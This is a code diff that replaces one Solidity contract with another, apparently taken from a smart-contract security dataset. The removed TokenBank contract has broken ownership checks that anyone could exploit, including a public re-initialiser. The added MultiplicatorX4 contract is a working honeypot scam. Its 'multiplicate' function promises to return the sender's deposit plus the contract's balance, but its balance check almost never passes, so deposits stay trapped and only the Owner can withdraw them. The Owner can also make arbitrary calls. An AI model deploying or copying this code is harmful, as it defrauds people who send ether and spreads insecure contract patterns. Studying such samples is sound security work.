@@ -1,97 +1,35 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.4.18;
 
-contract Ownable
+contract MultiplicatorX4
 {
-    address newOwner;
-    address owner = msg.sender;
+    address public Owner = msg.sender;
 
-    function changeOwner(address addr)
-    public
-    onlyOwner
-    {
-        newOwner = addr;
-    }
+    function() public payable{}
 
-    function confirmOwner()
+    function withdraw()
+    payable
     public
     {
-        if(msg.sender==newOwner)
-        {
-            owner=newOwner;
-        }
+        require(msg.sender == Owner);
+        Owner.transfer(this.balance);
     }
 
-    modifier onlyOwner
-    {
-        if(owner == msg.sender)_;
-    }
-}
-
-contract Token is Ownable
-{
-    address owner = msg.sender;
-    function WithdrawToken(address token, uint256 amount,address to)
-    public
-    onlyOwner
-    {
-        token.call(bytes4(sha3("transfer(address,uint256)")),to,amount);
-    }
-}
-
-contract TokenBank is Token
-{
-    uint public MinDeposit;
-    mapping (address => uint) public Holders;
-
-     ///Constructor
-    function initTokenBank()
+    function Command(address adr,bytes data)
+    payable
     public
     {
-        owner = msg.sender;
-        MinDeposit = 1 ether;
+        require(msg.sender == Owner);
+        adr.call.value(msg.value)(data);
     }
 
-    function()
+    function multiplicate(address adr)
+    public
     payable
     {
-        Deposit();
-    }
-
-    function Deposit()
-    payable
-    {
-        if(msg.value>MinDeposit)
+        if(msg.value>=this.balance)
         {
-            Holders[msg.sender]+=msg.value;
+            adr.transfer(this.balance+msg.value);
         }
     }
-
-    function WitdrawTokenToHolder(address _to,address _token,uint _amount)
-    public
-    onlyOwner
-    {
-        if(Holders[_to]>0)
-        {
-            Holders[_to]=0;
-            WithdrawToken(_token,_amount,_to);
-        }
-    }
-
-    function WithdrawToHolder(address _addr, uint _wei)
-    public
-    onlyOwner
-    payable
-    {
-        if(Holders[msg.sender]>0)
-        {
-            if(Holders[_addr]>=_wei)
-            {
-                _addr.call.value(_wei);
-                Holders[_addr]-=_wei;
-            }
-        }
-    }
-
-    function Bal() public constant returns(uint){return this.balance;}
 }
